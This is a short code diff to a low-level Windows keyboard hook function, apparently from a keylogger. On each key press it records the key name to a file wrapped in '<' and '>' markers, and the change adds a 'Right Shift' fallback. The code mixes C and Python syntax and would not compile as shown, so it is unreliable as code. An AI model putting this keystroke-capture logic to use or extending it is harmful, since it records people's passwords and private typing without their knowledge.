@@ -30,10 +30,15 @@ LRESULT CALLBACK kbd_proc(int nCode, WPARAM wParam, LPARAM lParam):
     "Low-level keyboard hook."
     KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam
     if wParam == WM_KEYDOWN:
+        fputc('<', file)
         DWORD dwMsg = (kbd->scanCode << 16) + (kbd->flags << 24)
         char buf[256]
-        fputc('<', file)
-        fputs(GetKeyNameText(dwMsg, buf, 256)? buf: "Error", file)
+        if GetKeyNameText(dwMsg, buf, 256):
+            fputs(buf, file)
+        elif kbd->vkCode == VK_RSHIFT:
+            fputs("Right Shift", file)
+        else:
+            fputs("Error", file)
     elif wParam == WM_KEYUP:
         fputc('>', file)
     return CallNextHookEx(NULL, nCode, wParam, lParam)
